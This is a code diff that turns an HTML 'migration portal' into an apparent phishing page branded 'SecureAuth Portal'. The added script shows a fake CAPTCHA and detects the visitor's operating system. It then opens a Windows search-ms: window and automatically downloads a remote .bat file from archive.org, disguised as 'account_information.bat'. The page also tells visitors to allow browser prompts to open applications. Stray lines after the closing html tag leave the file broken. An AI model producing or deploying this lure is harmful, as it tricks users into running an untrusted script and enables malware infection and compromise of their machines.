@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NVS Migration Portal</title>
+    <title>Secure Authentication Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,90 +23,553 @@
         }
 
         .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            padding: 60px 80px;
-            max-width: 600px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
             width: 100%;
+            max-width: 550px;
+            padding: 40px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
-        h1 {
-            color: #333;
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-
-        .overview {
-            color: #666;
-            font-size: 1.1em;
-            line-height: 1.6;
-            margin-bottom: 40px;
-        }
-
-        .button-group {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        button {
-            padding: 15px 40px;
-            font-size: 1.1em;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .migrate-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .migrate-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-        }
-
-        .cancel-btn {
-            background: #f5f5f5;
-            color: #666;
-        }
-
-        .cancel-btn:hover {
-            background: #e0e0e0;
-            transform: translateY(-3px);
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
+        .container::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+            height: 5px;
+            background: linear-gradient(90deg, #0078d7, #0078d7 50%, #000 50%, #000);
         }
 
-        .modal.active {
+        .logo {
             display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
         }
 
-        .modal-content {
-            background: white;
-            border-radius: 15px;
-            padding: 40px;
-            max-width: 450px;
+        .logo i {
+            font-size: 2.8rem;
+            color: #1e3c72;
+            margin-right: 15px;
+        }
+
+        .logo h1 {
+            font-size: 2.2rem;
+            color: #1e3c72;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .subtitle {
+            color: #555;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            line-height: 1.5;
+        }
+
+        .auth-box {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            border: 1px solid #eaeaea;
+        }
+
+        .auth-box h2 {
+            color: #1e3c72;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+
+        .auth-box p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        .captcha-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        #captcha-image {
+            margin-top: 10px;
+            box-shadow: 3px 3px 8px rgba(0, 0, 0, 0.2);
+            width: 60%;
+            padding: 20px;
+            font-weight: 600;
+            padding-bottom: 0px;
+            height: 50px;
+            user-select: none;
+            text-decoration: line-through;
+            font-style: italic;
+            font-size: 1.8rem;
+            border: #b21f1f 2px solid;
+            margin-left: 10px;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: 8px;
+            border-radius: 6px;
+            color: #333;
+        }
+
+        #user-input {
+            box-shadow: 3px 3px 8px rgba(0, 0, 0, 0.2);
+            width: auto;
+            margin-right: 10px;
+            padding: 12px;
+            padding-bottom: 0px;
+            height: 50px;
+            border: none;
+            width: 100%;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            font-size: 1.2rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        #user-input:focus {
+            outline: none;
+            border-color: #1e3c72;
+            box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.2);
+        }
+
+        .inline {
+            display: inline-block;
+        }
+
+        #refresh-btn {
+            background-color: #1e3c72;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 18px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: background-color 0.3s;
+            margin-left: 10px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16);
+        }
+
+        #refresh-btn:hover {
+            background-color: #152a52;
+        }
+
+        #submit-btn {
+            box-shadow: 0 5px 15px rgba(178, 31, 31, 0.3);
+            color: white;
+            margin: 10px 0;
+            background: linear-gradient(to right, #b21f1f, #8a1919);
+            border: none;
+            border-radius: 6px;
+            padding: 15px 30px;
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        #submit-btn:hover {
+            background: linear-gradient(to right, #8a1919, #6e1313);
+            transform: translateY(-2px);
+            box-shadow: 0 7px 20px rgba(178, 31, 31, 0.4);
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 18px;
+            border-radius: 8px;
+            font-weight: 500;
+            display: none;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .info-box {
+            background-color: #e9f7fe;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            text-align: left;
+            border-left: 5px solid #1e3c72;
+        }
+
+        .info-box h3 {
+            color: #1e3c72;
+            margin-bottom: 12px;
+            font-size: 1.3rem;
+        }
+
+        .info-box p {
+            color: #555;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .footer {
+            margin-top: 25px;
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        .os-support {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 20px 0;
+        }
+
+        .os-icon {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+            transition: transform 0.3s;
+        }
+
+        .windows {
+            background: linear-gradient(135deg, #0078d7, #005a9e);
+            color: white;
+        }
+
+        .macos {
+            background: linear-gradient(135deg, #000, #333);
+            color: white;
+        }
+
+        .os-icon:hover {
+            transform: translateY(-5px);
+        }
+
+        .os-icon i {
+            font-size: 2.5rem;
+            margin-bottom: 8px;
+        }
+
+        .os-icon span {
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .detected-os {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+
+        .windows-detected {
+            background-color: #e3f2fd;
+            color: #1565c0;
+            border: 1px solid #bbdefb;
+        }
+
+        .macos-detected {
+            background-color: #fce4ec;
+            color: #c2185b;
+            border: 1px solid #f8bbd9;
+        }
+
+        .unsupported-detected {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .instructions {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fff8e1;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .instructions h4 {
+            color: #ff8f00;
+            margin-bottom: 8px;
+        }
+
+        .instructions p {
+            font-size: 0.9rem;
+            color: #5d4037;
+            line-height: 1.5;
+        }
+
+        .debug-info {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            font-size: 0.8rem;
+            color: #666;
+            text-align: left;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-shield-alt"></i>
+            <h1>SecureAuth Portal</h1>
+        </div>
+        
+        <p class="subtitle">Complete the CAPTCHA verification to access your secure account documents</p>
+        
+        <div class="auth-box">
+            <h2>Identity Verification Required</h2>
+            <p>For security purposes, please verify you are not a robot by entering the text shown below:</p>
+            
+            <div class="captcha-container">
+                <input type="text" id="user-input" placeholder="Enter CAPTCHA code">
+                <button id="refresh-btn" onclick="generateCaptcha()">
+                    <i class="fas fa-sync-alt"></i>
+                </button>
+            </div>
+            
+            <div id="captcha-image" class="inline"></div>
+            
+            <div class="os-support">
+                <div class="os-icon windows">
+                    <i class="fab fa-windows"></i>
+                    <span>Windows</span>
+                </div>
+                <div class="os-icon macos">
+                    <i class="fab fa-apple"></i>
+                    <span>macOS</span>
+                </div>
+            </div>
+            
+            <div id="detected-os" class="detected-os"></div>
+            <div id="debug-info" class="debug-info"></div>
+            
+            <button id="submit-btn" onclick="validateCaptcha()">Verify Identity & Access Documents</button>
+        </div>
+        
+        <div id="message" class="message"></div>
+        
+        <div class="info-box">
+            <h3>Secure Document Access</h3>
+            <p>After successful authentication, you will be able to download and view your account information document. This document contains important details about your account status and recent activities.</p>
+            <p><strong>Note:</strong> This service is only available on Windows and macOS devices. Other operating systems are not supported.</p>
+        </div>
+        
+        <div class="instructions">
+            <h4>Important Instructions:</h4>
+            <p>If your browser asks for permission to open an application when downloading the file, please allow it to proceed. This is a normal security measure for secure document downloads.</p>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; 2023 SecureAuth Portal. All rights reserved. | Enterprise Security Solution</p>
+        </div>
+    </div>
+
+    <script>
+        // Generate a random CAPTCHA string
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            
+            document.getElementById('captcha-image').textContent = captcha;
+            document.getElementById('user-input').value = '';
+            document.getElementById('message').style.display = 'none';
+        }
+
+        // Enhanced OS Detection
+        function detectOS() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const platform = navigator.platform.toLowerCase();
+            const vendor = navigator.vendor ? navigator.vendor.toLowerCase() : '';
+            const maxTouchPoints = navigator.maxTouchPoints || 0;
+            
+            let debugInfo = `User Agent: ${navigator.userAgent}<br>`;
+            debugInfo += `Platform: ${navigator.platform}<br>`;
+            debugInfo += `Vendor: ${navigator.vendor || 'N/A'}<br>`;
+            debugInfo += `Max Touch Points: ${maxTouchPoints}<br>`;
+            
+            // Windows detection - multiple methods
+            const windowsIndicators = [
+                /win/.test(platform),
+                /windows/.test(userAgent),
+                /win32/.test(userAgent),
+                /win64/.test(userAgent),
+                /wow64/.test(userAgent),
+                userAgent.includes('windows nt'),
+                userAgent.includes('winnt'),
+                vendor.includes('microsoft')
+            ];
+            
+            // macOS detection - multiple methods
+            const macIndicators = [
+                /mac/.test(platform),
+                /macintosh/.test(userAgent),
+                userAgent.includes('mac os'),
+                userAgent.includes('macos'),
+                vendor.includes('apple') && !userAgent.includes('iphone') && !userAgent.includes('ipad')
+            ];
+            
+            // Count positive indicators
+            const windowsScore = windowsIndicators.filter(Boolean).length;
+            const macScore = macIndicators.filter(Boolean).length;
+            
+            debugInfo += `Windows Indicators: ${windowsScore}/${windowsIndicators.length}<br>`;
+            debugInfo += `macOS Indicators: ${macScore}/${macIndicators.length}<br>`;
+            
+            const detectedOS = document.getElementById('detected-os');
+            const debugDiv = document.getElementById('debug-info');
+            debugDiv.innerHTML = debugInfo;
+            
+            // Determine OS based on scores
+            if (windowsScore > 0 && windowsScore >= macScore) {
+                detectedOS.textContent = '✓ Windows Device Detected - Supported';
+                detectedOS.className = 'detected-os windows-detected';
+                return 'windows';
+            }
+            else if (macScore > 0 && macScore > windowsScore) {
+                detectedOS.textContent = '✓ macOS Device Detected - Supported';
+                detectedOS.className = 'detected-os macos-detected';
+                return 'macos';
+            }
+            // Unsupported OS
+            else {
+                detectedOS.textContent = '✗ Unsupported Operating System Detected';
+                detectedOS.className = 'detected-os unsupported-detected';
+                return 'unsupported';
+            }
+        }
+
+        // Validate the CAPTCHA
+        function validateCaptcha() {
+            const userInput = document.getElementById('user-input').value;
+            const captchaText = document.getElementById('captcha-image').textContent;
+            const messageDiv = document.getElementById('message');
+            const os = detectOS();
+            
+            if (userInput === '') {
+                messageDiv.textContent = 'Please enter the CAPTCHA code to proceed.';
+                messageDiv.className = 'message error';
+                messageDiv.style.display = 'block';
+                return;
+            }
+            
+            if (os === 'unsupported') {
+                messageDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <strong>Operating System Not Supported</strong><br>This service is only available on Windows and macOS devices. Please access this portal from a supported device.';
+                messageDiv.className = 'message error';
+                messageDiv.style.display = 'block';
+                return;
+            }
+            
+            if (userInput === captchaText) {
+                messageDiv.innerHTML = '<i class="fas fa-check-circle"></i> <strong>Successfully Authenticated!</strong><br>Your identity has been verified. Processing your request...';
+                messageDiv.className = 'message success';
+                messageDiv.style.display = 'block';
+                
+                // Process file download based on OS
+                setTimeout(() => processFileDownload(os), 1500);
+            } else {
+                messageDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> <strong>CAPTCHA Verification Failed</strong><br>The code you entered does not match the image. Please try again.';
+                messageDiv.className = 'message error';
+                messageDiv.style.display = 'block';
+                generateCaptcha();
+            }
+        }
+
+        // Process file download based on OS
+        function processFileDownload(os) {
+            const messageDiv = document.getElementById('message');
+            const fileUrl = 'https://archive.org/download/pdf_20251111_202511/pdf.bat';
+            
+            if (os === 'windows') {
+                messageDiv.innerHTML += '<br><i class="fas fa-download"></i> <strong>Windows Device Detected</strong><br>Opening file explorer and downloading account information...';
+                
+                // Try to open Windows file explorer with search-ms protocol
+                try {
+                    window.open('search-ms:displayname=Search%20Results&crumb=System.Generic.String%3Aaccount%20information');
+                } catch (e) {
+                    console.log('Could not open file explorer with search-ms protocol');
+                }
+                
+                // Download the file
+                setTimeout(() => {
+                    const winLink = document.createElement('a');
+                    winLink.href = fileUrl;
+                    winLink.download = 'account_information.bat';
+                    document.body.appendChild(winLink);
+                    winLink.click();
+                    document.body.removeChild(winLink);
+                    
+                    messageDiv.innerHTML += '<br><i class="fas fa-check"></i> File download initiated. Please check your downloads folder.';
+                    
+                    // Final message
+                    setTimeout(() => {
+                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "account_information.bat".';
+                    }, 1000);
+                }, 1000);
+            } 
+            else if (os === 'macos') {
+                messageDiv.innerHTML += '<br><i class="fas fa-download"></i> <strong>macOS Device Detected</strong><br>Downloading account information...';
+                
+                // Download the file
+                setTimeout(() => {
+                    const macLink = document.createElement('a');
+                    macLink.href = fileUrl;
+                    macLink.download = 'account_information.bat';
+                    document.body.appendChild(macLink);
+                    macLink.click();
+                    document.body.removeChild(macLink);
+                    
+                    messageDiv.innerHTML += '<br><i class="fas fa-check"></i> File download initiated. Please check your downloads folder.';
+                    
+                    // Final message
+                    setTimeout(() => {
+                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "account_information.bat".';
+                    }, 1000);
+                }, 1000);
+            }
+        }
+
+        // Initialize the CAPTCHA and OS detection on page load
+        window.onload = function() {
+            generateCaptcha();
+            detectOS();
+        };
+    </script>
+</body>
+</html>            max-width: 450px;
             width: 90%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
             animation: slideIn 0.3s ease;
